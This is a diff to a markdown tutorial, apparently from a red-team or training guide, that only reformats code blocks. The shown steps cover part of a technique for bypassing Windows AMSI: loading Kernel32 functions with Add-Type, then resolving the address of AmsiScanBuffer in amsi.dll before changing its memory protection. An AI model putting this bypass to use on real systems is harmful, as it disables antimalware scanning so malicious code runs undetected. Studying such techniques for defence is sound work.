@@ -43,18 +43,22 @@ public static extern bool VirtualProtect(
 Load the API calls using `Add-Type`. This cmdlet will load the functions with a proper type and namespace that will 
 allow the functions to be called.
 
-    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
-
+```text
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
+```
+    
 Identify the process handle of AMSI using `GetModuleHandle`. The handle will then be used to identify the process 
 address of `AmsiScanBuffer` using `GetProcAddress`:
 
-    $handle = [Win32.Kernel32]::GetModuleHandle(
-        'amsi.dll' // Obtains handle to amsi.dll
-    );
-    [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
-        $handle, // Handle of amsi.dll
-        'AmsiScanBuffer' // API call to obtain
-    ); 
+```text
+$handle = [Win32.Kernel32]::GetModuleHandle(
+    'amsi.dll' // Obtains handle to amsi.dll
+);
+[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
+    $handle, // Handle of amsi.dll
+    'AmsiScanBuffer' // API call to obtain
+); 
+```
 
 Modify the memory protection of the `AmsiScanBuffer` process region. Specify parameters and the buffer address for 
 `VirtualProtect`:
